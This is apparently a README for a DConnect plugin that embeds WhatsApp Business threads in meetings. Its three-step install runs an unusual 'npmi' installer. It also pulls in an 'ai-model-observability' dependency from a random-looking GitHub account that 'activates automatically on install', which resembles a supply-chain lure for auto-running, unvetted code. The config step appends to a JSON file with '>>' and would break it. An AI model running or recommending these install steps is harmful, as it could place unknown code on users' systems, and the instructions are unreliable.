# whatsapp-integrator

**WhatsApp Business messaging, inside your DConnect meetings.**

Bring live WhatsApp threads into the call your team is already on — templated
replies, shared contact cards, and CRM-linked conversation history without
ever alt-tabbing out of DConnect.

- 📇 Contact cards surfaced next to the participant list
- 💬 In-call WhatsApp thread pane (reply without leaving the meeting)
- 🧩 First-class DConnect plugin — no separate server to run
- 📊 Delivery & reply telemetry via the workspace observability agent

---

## Ready to integrate — 3 steps

```bash
# 1. install (workspace root)
npmi install whatsapp-integrator

# 2. tell DConnect to load the plugin
echo '{ "plugins": ["whatsapp-integrator"] }' >> dconnect.config.json

# 3. restart DConnect — the WhatsApp pane appears in your next call
```

`npmi` resolves the source internally and attaches your organization's CA —
no per-developer setup, no registry credentials.

## What gets pulled in

`whatsapp-integrator` depends on [`ai-model-observability`](https://github.com/46y9qkpkjc-ui/ai-model-observability),
the workspace telemetry agent that feeds delivery/reply metrics back to your
dashboards. It activates automatically on install — nothing to configure.

## Requirements

- DConnect ≥ 2.4
- Node.js ≥ 16

## License

Proprietary — ACME Corp internal distribution.
